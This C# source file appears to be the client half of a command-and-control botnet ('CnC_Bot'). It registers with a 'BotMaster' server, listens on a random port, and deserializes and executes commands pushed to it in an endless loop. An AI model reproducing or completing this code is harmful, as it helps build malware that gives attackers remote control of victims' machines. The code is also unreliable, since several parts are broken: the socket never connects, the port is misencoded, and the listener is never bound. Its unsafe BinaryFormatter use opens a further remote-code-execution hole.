using Common.Commands;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;

namespace CnC_Bot
{
    public class Bot
    {
        private int RandomCommandPort;
        private Socket CommandsSocket;

        /// <summary>
        /// Make initial contact with the server notifying him there is a new active bot.
        /// In addition, send the server the random generated port in which he should pass commands on.
        /// </summary>
        /// <param name="serverIP">The server ip</param>
        /// <param name="serverPort">The server port</param>
        /// <returns>True on success ; False on failure</returns>
        private bool Connect(string serverIP, int serverPort)
        {
            try
            {
                IPEndPoint localEndPoint = new IPEndPoint(Convert.ToInt64(serverIP), serverPort);
                Socket connectMessage = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                
                Random rand = new Random();
                RandomCommandPort = rand.Next(3000, 8000);

                connectMessage.Send(Convert.FromBase64String(String.Format("{0}", RandomCommandPort)));
                connectMessage.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to connect to BotMaster!{0}",ex.ToString());
                return false;
            }

            return true;
        }

        /// <summary>
        /// The method that initiate all.
        /// 1. Make first contact with server and send the listening port.
        /// 2. Wait for commands to come and execute them.
        /// </summary>
        /// <param name="serverIP">The server ip</param>
        /// <param name="serverPort">The server port</param>
        public void Start(string serverIP, int serverPort)
        {
            if (Connect(serverIP, serverPort))
            {
                Listen();
                while (true)
                {
                    Recv_Command();
                }
            }
        }

        /// <summary>
        /// Open socket for incoming commands from server.
        /// </summary>
        private void Listen()
        {
            try
            {
                // Establish the local endpoint for the socket.
                // Dns.GetHostName returns the name of the host running the application.
                IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress ipAddr = ipHost.AddressList[0];
                IPEndPoint localEndPoint = new IPEndPoint(ipAddr, RandomCommandPort);

                // Creation TCP/IP Socket using socket Class Costructor
                this.CommandsSocket = new Socket(ipAddr.AddressFamily,
                             SocketType.Stream, ProtocolType.Tcp);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to create listening socket on port {0}\n{1}", RandomCommandPort, ex.ToString());
            }
        }

        private void Recv_Command()
        {
            try
            {
                /* Get a new connection from the server */
                Socket serverCommandSocket = CommandsSocket.Accept();

                byte[] commandData = new byte[2048];
                serverCommandSocket.Receive(commandData);

                BinaryFormatter formattor = new BinaryFormatter();
                MemoryStream ms = new MemoryStream(commandData);

                /* Retrieve the command object, execute it and return the result to the server */
                Command currentCommand = (Command)formattor.Deserialize(ms);
                currentCommand.Execute(serverCommandSocket);

                serverCommandSocket.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while getting and parsing new command.\n{0}", ex.ToString());
            }
        }
    }
}
